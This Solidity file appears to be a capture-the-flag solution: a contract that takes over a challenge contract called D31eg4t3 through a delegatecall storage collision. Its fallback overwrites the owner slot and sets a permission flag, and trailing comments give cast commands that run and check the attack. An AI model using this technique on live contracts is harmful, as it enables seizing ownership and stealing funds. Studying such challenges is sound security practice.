// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {D31eg4t3} from "./D31eg4t3.sol";
contract HackerDelegate {
   uint public a;
   uint public b;
   uint public c;
   uint public d;
   uint public e;
   address public owner;
    mapping(address => bool) public yesICan;
   function pwn(address target) public {
        (bool success,)= D31eg4t3(target).hackMe("");
        require(success, "Hacking failed");
   }


    fallback() external payable {
        owner=tx.origin;
        yesICan[owner]=true;
    }

}
// cast call $CONTRACT_ADDRESS_HACKERDELEGATE "pwn(address)" "0x5FbDB2315678afecb367f032d93F642f64180aa3"  --rpc-url $RPC_URL --private-key $PRIVATE_KEY2 
// cast call $CONTRACT_ADDRESS_DELEGATE "canYouHackMe(address)" "0x70997970C51812dc3A010C7d01b50e0d17dc79C8"  --rpc-url $RPC_URL --private-key $PRIVATE_KEY2 
